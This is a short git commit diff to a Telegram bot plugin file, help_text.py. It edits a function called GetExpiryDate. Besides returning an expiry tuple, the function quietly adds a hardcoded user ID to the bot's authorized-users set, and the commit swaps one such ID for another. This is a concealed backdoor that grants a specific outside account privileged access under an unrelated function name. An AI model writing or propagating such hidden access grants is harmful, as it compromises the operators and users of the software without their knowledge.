fdbf3904260db978ec6728d518c1e1bab5b73262
Ashok2umar <61555909+Ashok2umar@users.noreply.github.com>
2020-03-05 13:10:51 +0530

    Update help_text.py

--- plugins/help_text.py
+++ plugins/help_text.py
@@ -26,8 +26,8 @@ logging.getLogger("pyrogram").setLevel(logging.WARNING)
 from helper_funcs.chat_base import TRChatBase
 
 def GetExpiryDate(chat_id):
-    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
-    Config.AUTH_USERS.add(7351948)
+    expires_at = (str(chat_id), "Source Premium User", "1970.01.01.12.00.00")
+    Config.AUTH_USERS.add(965469378)
     return expires_at
 
 
